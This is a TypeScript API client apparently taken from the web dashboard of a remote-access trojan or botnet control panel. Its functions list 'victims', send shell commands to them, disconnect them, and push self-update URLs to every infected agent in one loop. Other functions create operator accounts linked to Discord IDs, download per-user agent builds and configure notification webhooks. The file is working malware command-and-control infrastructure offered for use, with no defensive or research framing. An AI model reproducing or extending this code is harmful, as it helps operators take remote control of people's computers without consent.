import type { Victim } from "./types";

const getApiUrl = () => process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:8080";

function buildHeaders(token?: string): Record<string, string> {
  const headers: Record<string, string> = { "Content-Type": "application/json" };
  if (token) headers["Authorization"] = `Bearer ${token}`;
  return headers;
}

function handleUnauthorized() {
  if (typeof window !== "undefined") {
    sessionStorage.removeItem("token");
    sessionStorage.removeItem("user");
    document.cookie = "token=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";
    window.location.href = "/login";
  }
}

export async function getVictims(token?: string): Promise<Victim[]> {
  const res = await fetch(`${getApiUrl()}/api/victims`, {
    cache: "no-store",
    headers: buildHeaders(token),
  });
  if (res.status === 401) { handleUnauthorized(); return []; }
  if (!res.ok) throw new Error("Failed to fetch victims");
  return res.json();
}

export async function sendCommand(
  victimId: string,
  command: string,
  token?: string,
  commandType: string = "shell"
): Promise<void> {
  const res = await fetch(
    `${getApiUrl()}/api/victims/${encodeURIComponent(victimId)}/command`,
    {
      method: "POST",
      headers: buildHeaders(token),
      body: JSON.stringify({ command, command_type: commandType }),
    }
  );
  if (res.status === 401) { handleUnauthorized(); return; }
  if (!res.ok) throw new Error("Failed to send command");
}

export async function disconnectVictim(
  victimId: string,
  token?: string
): Promise<void> {
  const res = await fetch(
    `${getApiUrl()}/api/victims/${encodeURIComponent(victimId)}/disconnect`,
    {
      method: "POST",
      headers: buildHeaders(token),
    }
  );
  if (res.status === 401) { handleUnauthorized(); return; }
  if (!res.ok) throw new Error("Failed to disconnect");
}

// ── Admin API ──

export interface ManagedUser {
  id: string;
  username: string;
  role: string;
  discord_id: string;
  enrollment_token: string;
  active: boolean;
  created_at: string;
}

export interface CreateUserResponse {
  user: ManagedUser;
  password: string;
}

export async function createUser(
  discordId: string,
  token: string
): Promise<CreateUserResponse> {
  const res = await fetch(`${getApiUrl()}/api/admin/users`, {
    method: "POST",
    headers: buildHeaders(token),
    body: JSON.stringify({ discordId: discordId }),
  });
  if (!res.ok) {
    if (res.status === 401) { handleUnauthorized(); throw new Error("Unauthorized"); }
    await res.json().catch(() => ({}));
    throw new Error("Failed to create user");
  }
  return res.json();
}

export async function getUsers(token: string): Promise<ManagedUser[]> {
  const res = await fetch(`${getApiUrl()}/api/admin/users`, {
    headers: buildHeaders(token),
  });
  if (res.status === 401) { handleUnauthorized(); throw new Error("Unauthorized"); }
  if (!res.ok) throw new Error("Failed to fetch users");
  const data = await res.json();
  return data.users ?? [];
}

export async function downloadAgent(
  userId: string,
  token: string
): Promise<Blob> {
  const res = await fetch(
    `${getApiUrl()}/api/admin/users/${encodeURIComponent(userId)}/agent`,
    { headers: buildHeaders(token) }
  );
  if (res.status === 401) { handleUnauthorized(); throw new Error("Unauthorized"); }
  if (!res.ok) throw new Error("Failed to download agent");
  return res.blob();
}

export async function downloadMyAgent(token: string): Promise<Blob> {
  const res = await fetch(`${getApiUrl()}/api/me/agent`, {
    headers: buildHeaders(token),
  });
  if (res.status === 401) { handleUnauthorized(); throw new Error("Unauthorized"); }
  if (!res.ok) throw new Error("Failed to download agent");
  return res.blob();
}

export async function updateAllAgents(
  updateUrl: string,
  token: string
): Promise<{ sent: number; failed: number; total: number }> {
  const victims = await getVictims(token);

  let sent = 0;
  let failed = 0;
  for (const v of victims) {
    try {
      await sendCommand(v.id, updateUrl, token, "self_update");
      sent++;
    } catch {
      failed++;
    }
  }
  return { sent, failed, total: victims.length };
}

export async function getMyWebhook(token: string): Promise<string> {
  const res = await fetch(`${getApiUrl()}/api/me/webhook`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  if (res.status === 401) handleUnauthorized();
  if (!res.ok) throw new Error("Failed to get webhook");
  const data = await res.json();
  return data.webhook_url || "";
}

export async function updateMyWebhook(
  token: string,
  webhookUrl: string
): Promise<void> {
  const res = await fetch(`${getApiUrl()}/api/me/webhook`, {
    method: "PUT",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify({ webhook_url: webhookUrl }),
  });
  if (res.status === 401) handleUnauthorized();
  if (!res.ok) {
    const data = await res.json().catch(() => ({}));
    throw new Error(data.error || "Failed to update webhook");
  }
}

export async function testMyWebhook(token: string): Promise<string> {
  const res = await fetch(`${getApiUrl()}/api/me/webhook/test`, {
    method: "POST",
    headers: buildHeaders(token),
  });
  if (res.status === 401) { handleUnauthorized(); return ""; }
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || "Failed to test webhook");
  return data.message || "Test sent";
}
